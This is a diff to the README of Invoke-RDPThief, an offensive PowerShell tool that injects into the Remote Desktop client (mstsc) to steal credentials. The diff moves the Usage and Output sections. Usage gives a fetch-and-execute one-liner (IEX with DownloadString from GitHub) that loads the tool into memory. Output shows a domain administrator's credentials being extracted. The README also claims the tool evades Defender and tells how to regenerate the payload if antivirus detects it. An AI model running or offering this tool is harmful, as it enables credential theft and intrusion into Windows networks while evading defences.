@@ -6,6 +6,25 @@ RDPThief.dll was converted to shellcode with Donut, then converted to UUIDs with
 
 Works against Defender as of 01/10/2024
 
+## Usage
+```powershell
+# Load into memory and execute
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/Invoke-RDPThief/refs/heads/main/Invoke-RDPThief.ps1")
+
+```
+## Output
+```
+[*] Hunting for mstsc...
+
+[+] Successfully injected into process 5496
+
+[+] Extracted Credentials
+
+Server   : DC01.Security.local
+Username : SECURITY\administrator
+Password : Password123
+```
+
 ## Payload creation
 The payload in the script is ready to go however, the steps below can be followed if the payload is signatured in the future.
 
@@ -26,21 +45,4 @@ Donut: https://github.com/TheWover/donut
 
 Shellgen: https://github.com/Leo4j/ShellGen
 
-## Usage
-```powershell
-# Load into memory and execute
-IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/Invoke-RDPThief/refs/heads/main/Invoke-RDPThief.ps1")
 
-```
-## Output
-```
-[*] Hunting for mstsc...
-
-[+] Successfully injected into process 5496
-
-[+] Extracted Credentials
-
-Server   : DC01.Security.local
-Username : SECURITY\administrator
-Password : Password123
-```
